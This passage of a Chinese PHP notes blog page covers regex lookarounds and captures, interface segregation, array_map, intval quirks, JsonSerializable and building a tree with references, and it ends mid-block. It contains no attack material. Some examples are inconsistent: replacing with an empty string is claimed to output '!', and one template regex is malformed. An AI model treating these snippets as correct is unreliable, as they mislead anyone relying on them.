class="comment">//learnku.com/articles/28683</span></span><br></pre></td></tr></table></figure>
<h3 id="正则表达式之难点"><a href="#正则表达式之难点" class="headerlink" title="正则表达式之难点"></a>正则表达式之难点</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">断言 ?&lt;= 这个是对需要匹配的目标左边的（前面）的进行断言，断定它前面会出现的 但是不会被匹配到。如：</span><br><span class="line">$subject = 'I am Lancer, Please say hello Lancer';</span><br><span class="line"></span><br><span class="line">//目标： 我要把hello 后面的Lancer  改为  '!' .</span><br><span class="line">$pattern = '/(?&lt;=hello )Lancer/';</span><br><span class="line">$result = preg_replace($pattern, '', $subject);</span><br><span class="line">echo $result;  //I am Lancer, Please say hello !</span><br><span class="line">这样就成功咯~</span><br><span class="line">?=,与上面的位置刚好相反，这个是对需要匹配的目标右边的（后面）的进行断言，断定它后面会出现的 但是不会被匹配到。如：</span><br><span class="line">$subject = 'I love you! I love her too!';</span><br><span class="line"></span><br><span class="line">//目标：不能爱这么多， 把第二个 'love' 改为 'hate'</span><br><span class="line">$pattern = '/love(?= her)/';</span><br><span class="line">$result = preg_replace($pattern, 'hate', $subject);</span><br><span class="line">echo $result;  //'I love you! I hate her too!'</span><br><span class="line">?&lt;!这个是需要对匹配左边的（前面的）进行断言，不过它是非，找到不是这个的。还是拿第一个例子来说：</span><br><span class="line">$subject = 'I am Lancer, Please say hello Lancer';</span><br><span class="line"></span><br><span class="line">//目标： 我还是要把hello 后面的Lancer  改为  '!'  该怎么做</span><br><span class="line">$pattern = '/(?&lt;!am )Lancer/';  //找到‘Lancer’前面不是'am '的'Lancer'</span><br><span class="line">$result = preg_replace($pattern, '', $subject);</span><br><span class="line">echo $result;  //I am Lancer, Please say hello !</span><br><span class="line">?!还是一样的秘方，还是一样的味道~</span><br><span class="line">$subject = 'I love you! I love her too!';</span><br><span class="line"></span><br><span class="line">//目标：不能爱这么多， 把第二个 'love' 改为 'hate'</span><br><span class="line">$pattern = '/love(?! you)/';</span><br><span class="line">$result = preg_replace($pattern, 'hate', $subject);</span><br><span class="line">echo $result;  //'I love you! I hate her too!'</span><br><span class="line">总结：这个断言，作用主要在，对于很多同样的目标，可是我只要其中的一个，或者多个的时候，那么就可以根据它的前面和后面，进行断言，来区分他们找到自己想要匹配的目标。</span><br><span class="line">捕获 先来说一下， 什么叫捕获。就是匹配之后，会根据你正则表达式中的（）来进行分组。一一捕获。打个比方：</span><br><span class="line">//为了显示方便，写了个show函数</span><br><span class="line">function show($str)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($str)) &#123;</span><br><span class="line">        echo null;</span><br><span class="line">    &#125; elseif (is_array($str) || is_object($str)) &#123;</span><br><span class="line">        echo '&lt;pre&gt;';</span><br><span class="line">        print_r($str);</span><br><span class="line">        echo '&lt;/pre&gt;';</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//--------------------------------------------------------------------</span><br><span class="line">$subject  = '12323abcdea1233';</span><br><span class="line">$pattern = '/(a)(b)(c)(d)(e)/';</span><br><span class="line">preg_match_all($pattern, $subject, $matches);</span><br><span class="line">show($matches);&gt;&gt;&gt; $matches   </span><br><span class="line">               =&gt; [           </span><br><span class="line">                    [         </span><br><span class="line">                      "abcde",</span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "a",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "b",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "c",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "d",    </span><br><span class="line">                    ],        </span><br><span class="line">                    [         </span><br><span class="line">                      "e",    </span><br><span class="line">                    ],        </span><br><span class="line">                  ]           </span><br><span class="line">//这个答案，大家应该都知道吧。索引为0的是整个match的内容，接着的</span><br><span class="line">//就是捕获的每一个（）分组的内容。我们还可以这样来写：</span><br><span class="line"></span><br><span class="line">$subject = '123abcabc123';</span><br><span class="line">$pattern = '/(a)(b)(c)(\1)(\2)(\3)/';</span><br><span class="line">preg_match_all($pattern, $subject, $matches);</span><br><span class="line">show($matches);//??</span><br><span class="line">先看答案：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; abcabc</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; a</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [2] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; b</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [3] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; c</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [4] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; a</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [5] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; b</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [6] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; c</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">//你可能会有疑问， 咦,,, 怎么(\1)和(a)， (\2)和(b)，(\3)和(c) 在正则里是一样的呢？</span><br><span class="line">//其实 (a)就是指的第一组, 然后后面就可以用(\1)来表示。(b),(c)也一样。</span><br><span class="line">有人可能就会问了， 那你写这个的作用又是什么呢 ？ 获取这些括号里的干啥。。 我只要第一个索引的匹配就够了呀。</span><br><span class="line"></span><br><span class="line">但是， 你考虑到了替换这个因素没？ 如果我替换的时候需要（）的东西呢？ 这个时候，我们就可以用到捕获到的（）的东西来穿插。</span><br><span class="line">不知道有人好奇过没，为什么用那些TP框架，Laravel框架， 或者smarty 在模版里写的&#123;&#123;$msg&#125;&#125;为什么也能输出呢？ 其实就是用了正则替换~ 看代码：</span><br><span class="line"></span><br><span class="line">$msg = "正则捕获";</span><br><span class="line">$subject = '&lt;p&gt;&#123;&#123;$msg&#125;&#125;&lt;/p&gt;';</span><br><span class="line">$pattern = '/\&#123;\&#123;(.*/)\&#125;\&#125;/';  //因为正则里也有'&#123;' 和'&#125;'所以需要用‘\’转义</span><br><span class="line">$result = preg_replace($pattern, '&lt;?php echo $1; ?&gt;', $subject);</span><br><span class="line">show($result); // &lt;p&gt;&lt;?php echo $msg;?&gt;&lt;/p&gt; </span><br><span class="line">//成功修改~</span><br><span class="line">上面说的是捕获， 但是我可能不想捕获怎么办？ 那么就可以用(?:) 在前面加上?:即可。注意， 这个不会影响匹配 只会影响捕获。 如：</span><br><span class="line"></span><br><span class="line">$subject = 'abc';</span><br><span class="line">$pattern = '/(a)(?:b)(c)/';</span><br><span class="line">preg_match_all($pattern, $subject, $matches);</span><br><span class="line">show($matches);</span><br><span class="line">//结果：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; abc</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; a</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [2] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [0] =&gt; c</span><br><span class="line">        )</span><br><span class="line">)</span><br><span class="line">//看 匹配的结果让然是'abc' 不过没有捕获到 'b'</span><br><span class="line">https://coffeephp.com/articles/5</span><br></pre></td></tr></table></figure>
<h3 id="S-O-I-L-D-之接口隔离"><a href="#S-O-I-L-D-之接口隔离" class="headerlink" title="S.O.I.L.D 之接口隔离"></a>S.O.I.L.D 之接口隔离</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/29130</span></span><br><span class="line">interface WorkableInterface</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">interface</span> <span class="title">ManageableInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">beManaged</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">HumanWorker</span> <span class="title">implements</span> <span class="title">WorkableInterface</span>, <span class="title">SleepableInterface</span>, <span class="title">ManageableInterface</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'human working.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'human sleeping'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">beManaged</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;work();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;sleep();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AndroidWorker</span> <span class="title">implements</span> <span class="title">WorkableInterface</span>, <span class="title">ManageableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'android working.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">beManaged</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;work();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">保持 Captain 类的封闭性</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Captain</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">manage</span>(<span class="params">ManageableInterface $worker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $worker-&gt;beManaged();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$pieces = [];</span><br><span class="line">foreach($whole <span class="keyword">as</span> $item)</span><br><span class="line">&#123;</span><br><span class="line">    $pieces[] = $item[<span class="string">'foo'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $pieces;</span><br><span class="line"><span class="keyword">return</span> array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params">$item</span>) </span>&#123; <span class="keyword">return</span> $item[<span class="string">'foo'</span>]; &#125;,</span><br><span class="line">    $whole</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">但需要遍历 Key =&gt; Value 形式的关联数组，该怎么操作呢？</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">$k, $v</span>) </span>&#123; ... &#125;,</span><br><span class="line">    array_keys($array),</span><br><span class="line">    $array</span><br><span class="line">);</span><br><span class="line">https:<span class="comment">//wi1dcard.cn/posts/php-array-map-instead-of-foreach/</span></span><br></pre></td></tr></table></figure>
<h3 id="intval-与-int"><a href="#intval-与-int" class="headerlink" title="intval() 与 (int)"></a>intval() 与 (int)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$int = intval(<span class="string">'0123'</span>, <span class="number">8</span>); <span class="comment">// == 83</span></span><br><span class="line">$test_int    = <span class="number">12</span>;</span><br><span class="line">$test_float  = <span class="number">12.8</span>;</span><br><span class="line">$test_string = <span class="string">"12"</span>;</span><br><span class="line"></span><br><span class="line">echo (int) $test_int;         <span class="comment">// == 12</span></span><br><span class="line">echo (int) $test_float;       <span class="comment">// == 12</span></span><br><span class="line">echo (int) $test_string;      <span class="comment">// == 12</span></span><br><span class="line"></span><br><span class="line">echo intval($test_int, <span class="number">8</span>);    <span class="comment">// == 12</span></span><br><span class="line">echo intval($test_float, <span class="number">8</span>)   <span class="comment">// == 12</span></span><br><span class="line">echo intval($test_string, <span class="number">8</span>); <span class="comment">// == 10</span></span><br><span class="line">intval() 会将类型已经是 int 或 float 的数据当作「无需转换」而直接返回！</span><br><span class="line"></span><br><span class="line">所以如上，$test_int 和 $test_float 并没有按照八进制转换，使用时一定需要注意避免踩坑。</span><br></pre></td></tr></table></figure>
<h3 id="json-encode-序列化非公开属性"><a href="#json-encode-序列化非公开属性" class="headerlink" title="json_encode() 序列化非公开属性"></a>json_encode() 序列化非公开属性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="title">implements</span> \<span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $fooProperty;</span><br><span class="line"></span><br><span class="line">    protected $barProperty;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'fooProperty'</span> =&gt; $<span class="keyword">this</span>-&gt;fooProperty,</span><br><span class="line">            <span class="string">'barProperty'</span> =&gt; $<span class="keyword">this</span>-&gt;barProperty,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="title">implements</span> \<span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $fooProperty;</span><br><span class="line"></span><br><span class="line">    protected $barProperty;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get_object_vars($<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;https:<span class="comment">//wi1dcard.cn/posts/json-encode-non-public-properties/</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-引用详解"><a href="#PHP-引用详解" class="headerlink" title="PHP 引用详解"></a>PHP 引用详解</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">$catList = [</span><br><span class="line">    <span class="string">'1'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'颜色'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    <span class="string">'2'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">2</span>, <span class="string">'name'</span> =&gt; <span class="string">'规格'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    <span class="string">'3'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">3</span>, <span class="string">'name'</span> =&gt; <span class="string">'白色'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    <span class="string">'4'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">4</span>, <span class="string">'name'</span> =&gt; <span class="string">'黑色'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    <span class="string">'5'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">5</span>, <span class="string">'name'</span> =&gt; <span class="string">'大'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">    <span class="string">'6'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">6</span>, <span class="string">'name'</span> =&gt; <span class="string">'小'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">    <span class="string">'7'</span> =&gt; [<span class="string">'id'</span> =&gt; <span class="number">7</span>, <span class="string">'name'</span> =&gt; <span class="string">'黄色'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">];</span><br><span class="line">$treeData = [];</span><br><span class="line">foreach ($catList <span class="keyword">as</span> $item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isset($catList[$item[<span class="string">'parent_id'</span>]]) &amp;&amp; !empty($catList[$item[<span class="string">'parent_id'</span>]])) &#123;</span><br><span class="line">        <span class="comment">// 子分类</span></span><br><span class="line">        $catList[$item[<span class="string">'parent_id'</span>]][<span class="string">'children'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 一级分类</span></span><br><span class="line">        $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">=&gt; [                               </span><br><span class="line">     [                             </span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">1</span>,                  </span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"颜色"</span>,             </span><br><span class="line">       <span class="string">"parent_id"</span> =&gt; <span class="number">0</span>,           </span><br><span class="line">       <span class="string">"children"</span> =&gt; [             </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">3</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"白色"</span>,         </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">1</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">4</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"黑色"</span>,         </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">1</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">7</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"黄色"</span>,         </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">1</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">       ],                          </span><br><span class="line">     ],                            </span><br><span class="line">     [                             </span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">2</span>,                  </span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"规格"</span>,             </span><br><span class="line">       <span class="string">"parent_id"</span> =&gt; <span class="number">0</span>,           </span><br><span class="line">       <span class="string">"children"</span> =&gt; [             </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">5</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"大"</span>,          </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">2</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">         [                         </span><br><span class="line">           <span class="string">"id"</span> =&gt; <span class="number">6</span>,              </span><br><span class="line">           <span class="string">"name"</span> =&gt; <span class="string">"小"</span>,          </span><br><span class="line">           <span class="string">"parent_id"</span> =&gt; <span class="number">2</span>,       </span><br><span class="line">         ],                        </span><br><span class="line">       ],                          </span><br><span class="line">     ],                            </span><br><span class="line">   ]</span><br></pre></td></tr></table></figure>
<h3 id="封装代码"><a href="#封装代码" class="headerlink" title="封装代码"></a>封装代码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (IS_POST) &#123;</span><br><span class="line">    $like = <span 